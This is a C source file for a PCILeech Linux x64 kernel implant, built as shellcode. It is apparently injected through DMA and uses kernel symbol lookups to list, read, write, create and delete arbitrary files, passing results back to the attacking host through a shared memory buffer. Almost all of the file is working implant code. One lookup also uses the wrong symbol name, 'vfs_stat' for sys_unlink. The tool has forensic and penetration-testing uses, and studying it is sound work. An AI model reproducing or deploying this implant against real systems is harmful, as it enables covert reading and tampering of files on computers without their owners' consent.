// lx64_vfs.c : kernel code to support the PCILeech file system.
// Compatible with Linux x64.
//
// (c) Ulf Frisk, 2017-2021
// Author: Ulf Frisk, pcileech@frizk.net
//
// compile with:
// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel lx64_common.c
// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel lx64_vfs.c
// ml64 lx64_common_a.asm /Felx64_vfs.exe /link /NODEFAULTLIB /RELEASE /MACHINE:X64 /entry:main lx64_vfs.obj lx64_common.obj
// shellcode64.exe -o lx64_vfs.exe
// 

#include "lx64_common.h"

//-----------------------------------------------------------------------------
// Core defines and typedefs shared between kernel implants and pcileech.
//-----------------------------------------------------------------------------

#define VFS_OP_MAGIC				0x79e720ad93aa130f
#define VFS_OP_CMD_LIST_DIRECTORY	1
#define VFS_OP_CMD_WRITE			2
#define VFS_OP_CMD_READ				3
#define VFS_OP_CMD_CREATE			4
#define VFS_OP_CMD_DELETE			5

#define VFS_FLAGS_FILE_NORMAL		0x01
#define VFS_FLAGS_FILE_DIRECTORY	0x02
#define VFS_FLAGS_FILE_SYMLINK		0x04
#define VFS_FLAGS_FILE_OTHER		0x08
#define VFS_FLAGS_UNICODE			0x10
#define VFS_FLAGS_EXIST_FILE		0x20
#define VFS_FLAGS_TRUNCATE_ON_WRITE	0x40
#define VFS_FLAGS_APPEND_ON_WRITE	0x80

typedef struct tdVFS_OPERATION {
	QWORD magic;
	QWORD op;
	QWORD flags;
	CHAR szFileName[MAX_PATH];
	WCHAR wszFileName[MAX_PATH];
	QWORD offset;
	QWORD cb;
	BYTE pb[];
} VFS_OPERATION, *PVFS_OPERATION;

typedef struct tdVFS_RESULT_FILEINFO {
	QWORD flags;
	QWORD tAccessOpt;
	QWORD tModifyOpt;
	QWORD tCreateOpt;
	QWORD dbg1;
	QWORD dbg2;
	QWORD cb;
	WCHAR wszFileName[MAX_PATH];
} VFS_RESULT_FILEINFO, *PVFS_RESULT_FILEINFO;

//-----------------------------------------------------------------------------
// Other required defines and typedefs.
//-----------------------------------------------------------------------------

#define O_RDONLY			00000000
#define O_WRONLY			00000001
#define O_CREAT				00000100
#define O_TRUNC				00001000
#define O_APPEND			00002000
#define O_DIRECTORY			00200000
#define O_NOATIME			01000000

#define DT_UNKNOWN			0
#define DT_FIFO				1
#define DT_CHR				2
#define DT_DIR				4
#define DT_BLK				6
#define DT_REG				8
#define DT_LNK				10
#define DT_SOCK				12
#define DT_WHT				14

#define AT_FDCWD			-100
#define AT_NO_AUTOMOUNT		0x800
#define STATX_BASIC_STATS	0x000007ffU


struct timespec {
	QWORD	tv_sec;		// seconds
	QWORD	tv_nsec;	// nanoseconds
};

// kstat struct - kernels 4.10 and earlier.
struct kstat_4_10 {
	QWORD	ino;
	DWORD	dev;
	DWORD	mode;
	DWORD	nlink;
	DWORD	uid;
	DWORD	gid;
	DWORD	rdev;
	QWORD	size;	// offset 0x20
	struct timespec atime;
	struct timespec mtime;
	struct timespec ctime;
	QWORD	blksize;
	QWORD	blocks;
	QWORD	_pcileech_dummy_extra[2];
};

// kstat struct - kernels 4.11 and later.
struct kstat_4_11 {
	DWORD	result_mask;
	DWORD	mode;
	DWORD	nlink;
	DWORD	blksize;
	QWORD	attributes;
	QWORD	attributes_mask;
	QWORD	ino;
	DWORD	dev;
	DWORD	rdev;
	DWORD	uid;
	DWORD	gid;
	QWORD	size;
	struct timespec atime;
	struct timespec mtime;
	struct timespec ctime;
	struct timespec btime;
	QWORD	blocks;
	QWORD	_pcileech_dummy_extra[4];
};

//-----------------------------------------------------------------------------
// Functions below.
//-----------------------------------------------------------------------------

typedef struct tdFN2 {
	QWORD memcpy;
	QWORD memset;
	QWORD filp_close;
	QWORD filp_open;
	QWORD vfs_read;
	QWORD vfs_write;
	QWORD yield;
	QWORD iterate_dir_opt;
	QWORD vfs_readdir_opt;
	QWORD vfs_stat_opt;
	QWORD vfs_statx_opt;
    struct {
        QWORD sys_unlink;
        QWORD getname;
		QWORD getname_kernel;
        QWORD do_unlinkat;
    } rm;
	QWORD kern_path_opt;
	QWORD path_put_opt;
	QWORD vfs_getattr_nosec_opt;
	QWORD kernel_read;
	QWORD kernel_write;
} FN2, *PFN2;

typedef struct tdDIR_CONTEXT {
	QWORD actor;
	QWORD pos;
} DIR_CONTEXT;

typedef struct tdDIR_CONTEXT_EXTENDED {
	DIR_CONTEXT ctx;
	PKMDDATA pk;
	PFN2 fn;
	PVFS_OPERATION pop;
	QWORD buf[];
} DIR_CONTEXT_EXTENDED, *PDIR_CONTEXT_EXTENDED;

BOOL LookupFunctions2(PKMDDATA pk, PFN2 pfn2) {
	QWORD i = 0, NAMES[sizeof(FN2) / sizeof(QWORD)];
	NAMES[i++] = (QWORD)(CHAR[]) { 'm', 'e', 'm', 'c', 'p', 'y', 0 };
	NAMES[i++] = (QWORD)(CHAR[]) { 'm', 'e', 'm', 's', 'e', 't', 0 };
	NAMES[i++] = (QWORD)(CHAR[]) { 'f', 'i', 'l', 'p', '_', 'c', 'l', 'o', 's', 'e', 0 };
	NAMES[i++] = (QWORD)(CHAR[]) { 'f', 'i', 'l', 'p', '_', 'o', 'p', 'e', 'n', 0 };
	NAMES[i++] = (QWORD)(CHAR[]) { 'v', 'f', 's', '_', 'r', 'e', 'a', 'd', 0 };
	NAMES[i++] = (QWORD)(CHAR[]) { 'v', 'f', 's', '_', 'w', 'r', 'i', 't', 'e', 0 };	
	NAMES[i++] = (QWORD)(CHAR[]) { 'y', 'i', 'e', 'l', 'd', 0 };
	if(!LookupFunctions(pk->AddrKallsymsLookupName, (QWORD)NAMES, (QWORD)pfn2, i)) { return FALSE; }
	// optional lookup 1#: (due to kernel version differences)
	pfn2->iterate_dir_opt = LOOKUP_FUNCTION(pk, ((CHAR[]) { 'i', 't', 'e', 'r', 'a', 't', 'e', '_', 'd', 'i', 'r', 0 }));
	pfn2->vfs_readdir_opt = LOOKUP_FUNCTION(pk, ((CHAR[]) { 'v', 'f', 's', '_', 'r', 'e', 'a', 'd', 'd', 'i', 'r', 0 }));
	if(!pfn2->iterate_dir_opt && !pfn2->vfs_readdir_opt) { return FALSE; }
	// optional lookup 2#:
	pfn2->vfs_stat_opt = LOOKUP_FUNCTION(pk, ((CHAR[]) { 'v', 'f', 's', '_', 's', 't', 'a', 't', 0 }));
	pfn2->vfs_statx_opt = LOOKUP_FUNCTION(pk, ((CHAR[]) { 'v', 'f', 's', '_', 's', 't', 'a', 't', 'x', 0 }));
	if(!pfn2->vfs_stat_opt && !pfn2->vfs_statx_opt) { return FALSE; }
	pfn2->kern_path_opt = LOOKUP_FUNCTION(pk, ((CHAR[]) { 'k', 'e', 'r', 'n', '_', 'p', 'a', 't', 'h', 0 }));
	pfn2->path_put_opt = LOOKUP_FUNCTION(pk, ((CHAR[]) { 'p', 'a', 't', 'h', '_', 'p', 'u', 't', 0 }));
	pfn2->vfs_getattr_nosec_opt = LOOKUP_FUNCTION(pk, ((CHAR[]) { 'v', 'f', 's', '_', 'g', 'e', 't', 'a', 't', 't', 'r', '_', 'n', 'o', 's', 'e', 'c', 0 }));
    // optional lookup #3
    pfn2->rm.sys_unlink = LOOKUP_FUNCTION(pk, ((CHAR[]) { 'v', 'f', 's', '_', 's', 't', 'a', 't', 0 }));
    pfn2->rm.getname = LOOKUP_FUNCTION(pk, ((CHAR[]) { 'g', 'e', 't', 'n', 'a', 'm', 'e', 0 }));
	pfn2->rm.getname_kernel = LOOKUP_FUNCTION(pk, ((CHAR[]) { 'g', 'e', 't', 'n', 'a', 'm', 'e', '_', 'k', 'e', 'r', 'n', 'e', 'l', 0 }));
    pfn2->rm.do_unlinkat = LOOKUP_FUNCTION(pk, ((CHAR[]) { 'd', 'o', '_', 'u', 'n', 'l', 'i', 'n', 'k', 'a', 't', 0 }));
	if(!pfn2->rm.sys_unlink && !(pfn2->rm.getname && pfn2->rm.do_unlinkat)) { return FALSE; }
	// optional kernel vfs read/write #4:
	pfn2->kernel_read = LOOKUP_FUNCTION(pk, ((CHAR[]) { 'k', 'e', 'r', 'n', 'e', 'l', '_', 'r', 'e', 'a', 'd', 0 }));
	pfn2->kernel_write = LOOKUP_FUNCTION(pk, ((CHAR[]) { 'k', 'e', 'r', 'n', 'e', 'l', '_', 'w', 'r', 'i', 't', 'e', 0 }));
	return TRUE;
}

static int VfsList_CallbackIterateDir(PDIR_CONTEXT_EXTENDED ctx, const char *name, int len, unsigned __int64 pos, unsigned __int64 ino, unsigned int d_type)
{
	UNREFERENCED_PARAMETER(ino);
	UNREFERENCED_PARAMETER(pos);
	QWORD i;
	PVFS_RESULT_FILEINFO pfi;
	// note: function signature of filldir_t signature changed from returning int
	// to returning bool in kernel 6.1. set_memory_rox was added in kernel 6.2 -
	// since this is close enough use it. For kernel 6.2 iterate will fail after
	// first item, but it's a small enough issue to ignore for now.
	int retval = ctx->pk->fnlx.set_memory_rox ? 1 : 0;
	if(ctx->pk->dataOutExtraLength + sizeof(VFS_RESULT_FILEINFO) > ctx->pk->dataOutExtraLengthMax) {
		return retval;
	}
	pfi = (PVFS_RESULT_FILEINFO)(ctx->pk->DMAAddrVirtual + ctx->pk->dataOutExtraOffset + ctx->pk->dataOutExtraLength);
	switch(d_type) {
		case DT_REG:
			pfi->flags = VFS_FLAGS_FILE_NORMAL;
			break;
		case DT_DIR:
			pfi->flags = VFS_FLAGS_FILE_DIRECTORY;
			break;
		case DT_LNK:
			pfi->flags = VFS_FLAGS_FILE_SYMLINK;
			break;
		default:
			pfi->flags = VFS_FLAGS_FILE_OTHER;
			break;
	}
	for(i = 0; (i < len) && (i < MAX_PATH - 1); i++) {
		pfi->wszFileName[i] = name[i];
	}
	pfi->wszFileName[i] = 0;
	ctx->pk->dataOutExtraLength += sizeof(VFS_RESULT_FILEINFO);
	return retval;
}

QWORD UnixToWindowsFiletime(QWORD tv) {
	QWORD result = 11644473600ULL; // EPOCH DIFF
	result += tv;
	result *= 10000000ULL;
	return result;
}

VOID VfsList_SetSizeTime(PKMDDATA pk, PFN2 pfn2, PVFS_OPERATION pop)
{
	QWORD i, o, p, cfi, result;
	BYTE path[0x800];
	CHAR sz[2 * MAX_PATH];
	struct kstat_4_10 kstat_4_10;
	struct kstat_4_11 kstat_4_11;
	PVFS_RESULT_FILEINFO pfi;
	cfi = pk->dataOutExtraLength / sizeof(VFS_RESULT_FILEINFO);
	for(o = 0; o < MAX_PATH; o++) {
		if(0 == pop->szFileName[o]) { break; }
		sz[o] = pop->szFileName[o];
	}
	if(o && (sz[o - 1] != '/')) {
		sz[o] = '/';
		o++;
	}
	pk->dataOut[2] = cfi;
	for(p = 0; p < cfi; p++) {
		pfi = (PVFS_RESULT_FILEINFO)(pk->DMAAddrVirtual + pk->dataOutExtraOffset + p * sizeof(VFS_RESULT_FILEINFO));
		// set filename
		for(i = 0; i < MAX_PATH; i++) {
			if(0 == pfi->wszFileName[i]) { break; }
			sz[o + i] = (CHAR)pfi->wszFileName[i];
		}
		sz[o + i] = 0;
		if(pfn2->vfs_statx_opt) { // 4.11 kernels and later.
			result = 1;
			// 5.12 kernels and later will fail vfs_statx - use alternative method first:
			if(pfn2->kern_path_opt && pfn2->vfs_getattr_nosec_opt) {
				result = SysVCall(pfn2->kern_path_opt, sz, AT_NO_AUTOMOUNT, path);
				if(0 == result) {
					result = SysVCall(pfn2->vfs_getattr_nosec_opt, path, &kstat_4_11, STATX_BASIC_STATS, 0);
					if(pfn2->path_put_opt) { SysVCall(pfn2->path_put_opt, path); }
				}
			} else {
				// This will fail on kernel 5.18 and later due to signature change of vfs_statx
				result = SysVCall(pfn2->vfs_statx_opt, AT_FDCWD, sz, AT_NO_AUTOMOUNT, &kstat_4_11, STATX_BASIC_STATS);
			}
			if(0 == result) {
				pfi->cb = kstat_4_11.size;
				pfi->tAccessOpt = UnixToWindowsFiletime(kstat_4_11.atime.tv_sec);
				pfi->tCreateOpt = UnixToWindowsFiletime(kstat_4_11.ctime.tv_sec);
				pfi->tModifyOpt = UnixToWindowsFiletime(kstat_4_11.mtime.tv_sec);
			}
		} else if(pfn2->vfs_stat_opt) { // 4.10 kernels and earlier.
			result = SysVCall(pfn2->vfs_stat_opt, sz, &kstat_4_10);
			if(0 == result) {
				pfi->cb = kstat_4_10.size;
				pfi->tAccessOpt = UnixToWindowsFiletime(kstat_4_10.atime.tv_sec);
				pfi->tCreateOpt = UnixToWindowsFiletime(kstat_4_10.ctime.tv_sec);
				pfi->tModifyOpt = UnixToWindowsFiletime(kstat_4_10.mtime.tv_sec);
			}
		}
		if(0 == (p % 50)) { SysVCall(pfn2->yield); } // yield at intervals to avoid problems...
	}
}

STATUS VfsList(PKMDDATA pk, PFN2 pfn2, PVFS_OPERATION pop)
{
	DIR_CONTEXT_EXTENDED dce;
	QWORD hFile;
	hFile = SysVCall(pfn2->filp_open, pop->szFileName, O_RDONLY | O_DIRECTORY | O_NOATIME, 0);
	if(hFile > 0xffffffff00000000) {
		return STATUS_FAIL_FILE_CANNOT_OPEN;
	}
	WinCallSetFunction((QWORD)VfsList_CallbackIterateDir);
	dce.ctx.actor = (QWORD)WinCall;
	dce.ctx.pos = 0;
	dce.fn = pfn2;
	dce.pk = pk;
	dce.pop = pop;
	if(pfn2->iterate_dir_opt) {
		// use iterate_dir (kernel >= 3.11) 
		pk->dataOut[1] = SysVCall(pfn2->iterate_dir_opt, hFile, &dce);
	} else if(pfn2->vfs_readdir_opt) {
		// use vfs_readdir (kernel <= 3.10)
		pk->dataOut[1] = SysVCall(pfn2->vfs_readdir_opt, hFile, WinCall, &dce);
	}
	SysVCall(pfn2->filp_close, hFile, NULL);
	SysVCall(pfn2->yield);
	VfsList_SetSizeTime(pk, pfn2, pop);
	return STATUS_SUCCESS;
}

STATUS VfsDelete(PKMDDATA pk, PFN2 pfn2, PVFS_OPERATION pop)
{
	UNREFERENCED_PARAMETER(pk);
	QWORD ptr, result = 1;
	if(pfn2->rm.sys_unlink) {
		result = SysVCall(pfn2->rm.sys_unlink, pop->szFileName);
	} else if(pfn2->rm.getname_kernel && pfn2->rm.do_unlinkat) {
		ptr = SysVCall(pfn2->rm.getname_kernel, pop->szFileName);
		result = SysVCall(pfn2->rm.do_unlinkat, AT_FDCWD, ptr);
	} else if(pfn2->rm.getname && pfn2->rm.do_unlinkat) {
		ptr = SysVCall(pfn2->rm.getname, pop->szFileName);
		result = SysVCall(pfn2->rm.do_unlinkat, AT_FDCWD, ptr);
	}
	return result ? STATUS_FAIL_ACTION : STATUS_SUCCESS;
}

STATUS VfsRead(PKMDDATA pk, PFN2 pfn2, PVFS_OPERATION pop)
{
	QWORD hFile;
	hFile = SysVCall(pfn2->filp_open, pop->szFileName, O_RDONLY | O_NOATIME, 0);
	if(hFile > 0xffffffff00000000) {
		return STATUS_FAIL_FILE_CANNOT_OPEN;
	}
	pk->dataOutExtraLength = SysVCall((pfn2->kernel_read ? pfn2->kernel_read : pfn2->vfs_read), hFile, pk->DMAAddrVirtual + pk->dataOutExtraOffset, pk->dataOutExtraLengthMax, &pop->offset);
	SysVCall(pfn2->filp_close, hFile, NULL);
	return (pk->dataOutExtraLength <= pk->dataOutExtraLengthMax) ? STATUS_SUCCESS : STATUS_FAIL_ACTION;
}

STATUS VfsWrite(PKMDDATA pk, PFN2 pfn2, PVFS_OPERATION pop)
{
	UNREFERENCED_PARAMETER(pk);
	QWORD hFile, flags = 0, result;
	flags |= O_WRONLY | O_NOATIME;
	flags |= (pop->flags & VFS_FLAGS_TRUNCATE_ON_WRITE) ? O_TRUNC : 0;
	flags |= (pop->flags & VFS_FLAGS_APPEND_ON_WRITE) ? O_APPEND : 0;
	hFile = SysVCall(pfn2->filp_open, pop->szFileName, flags, 0);
	if(hFile > 0xffffffff00000000) {
		return STATUS_FAIL_FILE_CANNOT_OPEN;
	}
	result = SysVCall((pfn2->kernel_write ? pfn2->kernel_write : pfn2->vfs_write), hFile, pop->pb, pop->cb, &pop->offset);
	SysVCall(pfn2->filp_close, hFile, NULL);
	return result ? STATUS_FAIL_ACTION : STATUS_SUCCESS;
}

STATUS VfsCreate(PKMDDATA pk, PFN2 pfn2, PVFS_OPERATION pop)
{
	UNREFERENCED_PARAMETER(pk);
	QWORD hFile;
	hFile = SysVCall(pfn2->filp_open, pop->szFileName, O_CREAT | O_WRONLY | O_TRUNC, 0x1ff /*-rwxrwxrwx*/);
	if(hFile > 0xffffffff00000000) {
		return STATUS_FAIL_FILE_CANNOT_OPEN;
	}
	SysVCall(pfn2->filp_close, hFile, NULL);
	return STATUS_SUCCESS;
}

VOID c_EntryPoint(PKMDDATA pk)
{
	PVFS_OPERATION pop;
	FN2 fn2;
	// initialize kernel functions
	if(!LookupFunctions2(pk, &fn2)) {
		pk->dataOut[0] = STATUS_FAIL_FUNCTION_LOOKUP;
		return;
	}
	// setup references to in/out data and check validity
	pop = (PVFS_OPERATION)(pk->DMAAddrVirtual + pk->dataInExtraOffset);
	if((pk->dataInExtraLength < sizeof(VFS_OPERATION)) || (pop->magic != VFS_OP_MAGIC) || (pop->flags & VFS_FLAGS_UNICODE)) {
		pk->dataOut[0] = STATUS_FAIL_SIGNATURE_NOT_FOUND;
		return;
	}
	// take action
	if(pop->op == VFS_OP_CMD_LIST_DIRECTORY) {
		pk->dataOut[0] = VfsList(pk, &fn2, pop);
		return;
	}
	if(pop->op == VFS_OP_CMD_READ) {
		pk->dataOut[0] = VfsRead(pk, &fn2, pop);
		return;
	}
	if(pop->op == VFS_OP_CMD_WRITE) {
		pk->dataOut[0] = VfsWrite(pk, &fn2, pop);
		return;
	}
	if(pop->op == VFS_OP_CMD_CREATE) {
		pk->dataOut[0] = VfsCreate(pk, &fn2, pop);
		return;
	}
	if(pop->op == VFS_OP_CMD_DELETE) {
		pk->dataOut[0] = VfsDelete(pk, &fn2, pop);
		return;
	}
}
